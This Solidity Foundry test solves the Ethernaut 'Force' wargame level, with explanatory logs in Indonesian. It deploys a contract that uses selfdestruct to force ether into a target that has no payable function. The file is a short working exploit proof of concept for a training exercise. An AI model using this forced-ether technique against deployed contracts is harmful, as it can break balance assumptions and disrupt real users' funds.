// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../08-Force/ForceFactory.sol";
import "forge-std/Test.sol";

contract ForceAttack is Test {
    function test() external {
        address agus = makeAddr("agus");
        vm.createSelectFork(vm.envString("sepolia"));
        vm.deal(agus, 10 ether);
        Ethernaut ethernaut = new Ethernaut();
        ForceFactory factory = new ForceFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(agus, agus);
        address addr = ethernaut.createLevelInstance(factory);
        Force force = Force(addr);
        emit log("setup done!\nGoal: mengirim ether ke contract Force");
        bool zerobalance = address(force).balance == 0;
        assertTrue(zerobalance);
        emit log(
            "Penjelasan\nUntuk mengirim ether ke contract, dapat dilakukan dengan cara membuat function payable dan receive/fallback.\nLalu bagaimana jika tidak ada payable dan receive/fallback?\nJawabannya adalah menggunakan selfdestruct.\nSelfdestruct akan menghancurkan sebuah contract dan mengirim ether di dalamnya ke alamat yang sudah ditentukan."
        );
        emit log("PoC");
        emit log("1. deploy contract yang terdapat selfdestruct");
        ForceBomb bom = new ForceBomb{value: 1 ether}(payable(address(force)));
        emit log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}

contract ForceBomb {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
